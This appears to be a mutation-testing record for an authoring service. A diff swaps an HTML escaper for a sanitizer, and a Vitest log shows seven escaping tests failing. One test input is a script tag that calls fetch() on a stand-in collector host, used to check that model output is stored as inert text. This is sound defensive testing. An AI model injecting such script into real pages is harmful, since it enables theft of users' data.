@@ -1,0 +1,248 @@
+FIX-UP MUTANT 17: the body is sanitized as HTML again (the first round's fix)
+file: server/services/authoring/section-generation-service.ts
+--- mutation (diff vs the fix) ---
+--- <scratch>/fixes2/figure-writers/mutant-tmp-section-generation-service.ts	2026-09-28 19:28:41.111486701 +0000
++++ ./server/services/authoring/section-generation-service.ts	2026-09-28 19:28:41.111690567 +0000
+@@ -21,7 +21,7 @@
+ import auditService from '../auditService';
+ import { createScopedLogger } from '../../utils/logger';
+ import { PROMPTS_DIR } from '../ai-gateway/prompts-dir';
+-import { escapeHtml } from '../../export/authoring-blocks-to-html';
++import { sanitizeAuthoringSectionHtml as escapeHtml } from './authoring-html-sanitizer';
+ 
+ const logger = createScopedLogger('section-generation-service');
+ 
+
+--- test run ---
+
+ RUN  v4.1.7 ./
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > an external address: the stored draft holds no markup, and the result is what was stored
+{
+  "timestamp": "2026-09-28T19:28:44.632Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > dot segments out of the image route: the stored draft holds no markup, and the result is what was stored
+{
+  "timestamp": "2026-09-28T19:28:44.642Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > an inline SVG: the stored draft holds no markup, and the result is what was stored
+{
+  "timestamp": "2026-09-28T19:28:44.646Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > script the model emits is stored as text, never as an element
+{
+  "timestamp": "2026-09-28T19:28:44.650Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > a limit of quantitation: every word the model wrote is stored and read back
+{
+  "timestamp": "2026-09-28T19:28:44.653Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > an upper limit of normal: every word the model wrote is stored and read back
+{
+  "timestamp": "2026-09-28T19:28:44.660Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > a markdown autolink: every word the model wrote is stored and read back
+{
+  "timestamp": "2026-09-28T19:28:44.664Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > a plain comparison: every word the model wrote is stored and read back
+{
+  "timestamp": "2026-09-28T19:28:44.667Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > escapes exactly <, > and & (guard)
+{
+  "timestamp": "2026-09-28T19:28:44.670Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+stdout | server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > stores a markdown body with no <, > or & unchanged (guard)
+{
+  "timestamp": "2026-09-28T19:28:44.672Z",
+  "level": "info",
+  "message": "[section-generation-service] Generated section draft",
+  "context": {
+    "documentId": 901,
+    "sectionCode": "2.3.P.8",
+    "organizationId": 7
+  }
+}
+
+ × server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > an external address: the stored draft holds no markup, and the result is what was stored 23ms
+   → expected '<p>The product is stable for 24 month…' not to contain '<'
+ × server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > dot segments out of the image route: the stored draft holds no markup, and the result is what was stored 4ms
+   → expected '<p>The product is stable for 24 month…' not to contain '<'
+ × server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > an inline SVG: the stored draft holds no markup, and the result is what was stored 4ms
+   → expected '<p>The product is stable for 24 month…' not to contain '<'
+ × server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > script the model emits is stored as text, never as an element 4ms
+   → expected 'Summary.' to be 'Summary.&lt;script&gt;fetch("https://…' // Object.is equality
+ × server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > a limit of quantitation: every word the model wrote is stored and read back 7ms
+   → expected 'Impurity B was' to be 'Impurity B was <LOQ in all 3 batches;…' // Object.is equality
+ × server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > an upper limit of normal: every word the model wrote is stored and read back 3ms
+   → expected 'ALT remained' to be 'ALT remained <ULN (n=40) & no Hy\'s l…' // Object.is equality
+ × server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > a markdown autolink: every word the model wrote is stored and read back 4ms
+   → expected 'See for the method.' to be 'See <https://www.fda.gov/guidance> fo…' // Object.is equality
+ ✓ server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > a plain comparison: every word the model wrote is stored and read back 3ms
+ ✓ server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > escapes exactly <, > and & (guard) 3ms
+ ✓ server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > stores a markdown body with no <, > or & unchanged (guard) 1ms
+
+ Test Files  1 failed (1)
+      Tests  7 failed | 3 passed (10)
+   Start at  19:28:42
+   Duration  2.50s (transform 795ms, setup 86ms, import 2.19s, tests 60ms, environment 0ms)
+
+ DEPRECATED  `test.poolOptions` was removed in Vitest 4. All previous `poolOptions` are now top-level options. Please, refer to the migration guide: https://vitest.dev/guide/migration#pool-rework
+
+⎯⎯⎯⎯⎯⎯⎯ Failed Tests 7 ⎯⎯⎯⎯⎯⎯⎯
+
+ FAIL  server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > an external address: the stored draft holds no markup, and the result is what was stored
+ FAIL  server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > dot segments out of the image route: the stored draft holds no markup, and the result is what was stored
+ FAIL  server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > an inline SVG: the stored draft holds no markup, and the result is what was stored
+AssertionError: expected '<p>The product is stable for 24 month…' not to contain '<'
+
+Expected: "<"
+Received: "<p>The product is stable for 24 months.</p>"
+
+ ❯ server/services/authoring/__tests__/section-generation-figures.test.ts:75:24
+     73|     expect(h.inserted).toHaveLength(1);
+     74|     const stored = String(h.inserted[0].content);
+     75|     expect(stored).not.toContain('<');
+       |                        ^
+     76|     expect(htmlToPlainText(stored)).toBe(modelBody);
+     77|     expect(result.body).toBe(stored);
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[1/7]⎯
+
+ FAIL  server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > script the model emits is stored as text, never as an element
+AssertionError: expected 'Summary.' to be 'Summary.&lt;script&gt;fetch("https://…' // Object.is equality
+
+Expected: "Summary.&lt;script&gt;fetch("https://collector.example")&lt;/script&gt;"
+Received: "Summary."
+
+ ❯ server/services/authoring/__tests__/section-generation-figures.test.ts:85:20
+     83|     await generate('Summary.<script>fetch("https://collector.example")…
+     84|     const stored = String(h.inserted[0].content);
+     85|     expect(stored).toBe('Summary.&lt;script&gt;fetch("https://collecto…
+       |                    ^
+     86|   });
+     87|
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[2/7]⎯
+
+ FAIL  server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > a limit of quantitation: every word the model wrote is stored and read back
+AssertionError: expected 'Impurity B was' to be 'Impurity B was <LOQ in all 3 batches;…' // Object.is equality
+
+Expected: "Impurity B was <LOQ in all 3 batches; assay was 99.1%."
+Received: "Impurity B was"
+
+ ❯ server/services/authoring/__tests__/section-generation-figures.test.ts:97:37
+     95|     const stored = String(h.inserted[0].content);
+     96|     expect(stored).not.toContain('<');
+     97|     expect(htmlToPlainText(stored)).toBe(text);
+       |                                     ^
+     98|   });
+     99|
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[3/7]⎯
+
+ FAIL  server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > an upper limit of normal: every word the model wrote is stored and read back
+AssertionError: expected 'ALT remained' to be 'ALT remained <ULN (n=40) & no Hy\'s l…' // Object.is equality
+
+Expected: "ALT remained <ULN (n=40) & no Hy's law case was seen."
+Received: "ALT remained"
+
+ ❯ server/services/authoring/__tests__/section-generation-figures.test.ts:97:37
+     95|     const stored = String(h.inserted[0].content);
+     96|     expect(stored).not.toContain('<');
+     97|     expect(htmlToPlainText(stored)).toBe(text);
+       |                                     ^
+     98|   });
+     99|
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[4/7]⎯
+
+ FAIL  server/services/authoring/__tests__/section-generation-figures.test.ts > generateSection stores the model body as text > a markdown autolink: every word the model wrote is stored and read back
+AssertionError: expected 'See for the method.' to be 'See <https://www.fda.gov/guidance> fo…' // Object.is equality
+
+Expected: "See <https://www.fda.gov/guidance> for the method."
+Received: "See for the method."
+
+ ❯ server/services/authoring/__tests__/section-generation-figures.test.ts:97:37
+     95|     const stored = String(h.inserted[0].content);
+     96|     expect(stored).not.toContain('<');
+     97|     expect(htmlToPlainText(stored)).toBe(text);
+       |                                     ^
+     98|   });
+     99|
+
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[5/7]⎯
+
